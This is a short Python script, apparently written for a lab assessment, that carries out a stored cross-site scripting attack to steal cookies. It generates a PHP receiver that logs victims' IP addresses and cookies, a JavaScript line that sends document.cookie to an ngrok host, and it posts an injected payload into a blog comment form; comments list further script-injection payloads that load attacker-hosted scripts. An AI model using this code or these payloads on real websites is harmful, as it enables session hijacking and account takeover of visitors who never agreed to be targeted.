#!/usr/bin/python3
# :author Arturo Negreiros (aka H0neyL0xd)

# 'Droid Sans Mono', 'monospace', monospace, 'Droid Sans Fallback'

import json
import sys
import requests


def crete_files():
    
    with open("index.php", "w") as file:
        file.write("""<?php
            if (isset($_GET['c'])) {
                $list = explode(";", $_GET['c']);
                foreach ($list as $key => $value) {
                    $cookie = urldecode($value);
                    $file = fopen("cookies.txt", "a+");
                    fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
                    fclose($file);
                }
            }
            ?>""")
    
    with open("script.js", "w") as jsfile:
        jsfile.write("""new Image().src='https://5a1d-157-100-198-203.sa.ngrok.io/index.php?c='+document.cookie""")


def XSS_final_attack(url):
    # for the final assessment, we must to have
    # a http server listening for incoming connections
    #     payload = """<script src=http:/<your ip>/script.js></script>
    # '><script src=http:/<your ip>/script.js></script>
    # "><script src=http:/<your ip>/script.js></script>
    # javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http:/<your ip>\\';document.body.appendChild(a)')
    # <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "/<your ip>/");a.send();</script>
    # <script>$.getScript("http:/<your ip>/index.php")</script>"""
    
    with open("another.js", "r") as f:
        payload = f.read()

    print(payload)
    sess = requests.session()
    
    payload_data = {
        "comment":"payload",
        "author":"payload",
        "email":"a@e.com",
        "url":payload
    }
    
    response = requests.post(url=url, data=payload_data)
    print(response.text)



def main():
    # http://10.129.16.21/assessment/index.php/2021/06/11/welcome-to-security-blog/#comment-7
    # crete_files()
    base_url = sys.argv[1]
    XSS_final_attack(url=base_url)



if __name__ == "__main__":
    main()